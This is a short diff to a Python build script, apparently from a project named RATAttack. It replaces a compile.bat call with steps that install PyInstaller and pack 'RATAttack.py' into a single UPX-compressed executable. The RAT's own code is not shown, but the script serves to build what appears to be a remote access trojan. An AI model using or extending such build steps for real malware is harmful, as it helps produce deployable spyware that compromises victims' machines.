@@ -28,7 +28,10 @@ s('pip install '+fileB)
 if not auto:
     input('\n\nDid the install run correctly?\n\n\nPress ENTER to build')
 
-s('compile.bat')
+# s('compile.bat')
+s('pip install pyinstaller')
+
+s('pyinstaller --clean --upx-dir "upx395w" --onefile "RATAttack.py"')
 
 if exists('dist/RATAttack.exe'):
     print('\n\nScript has finished')
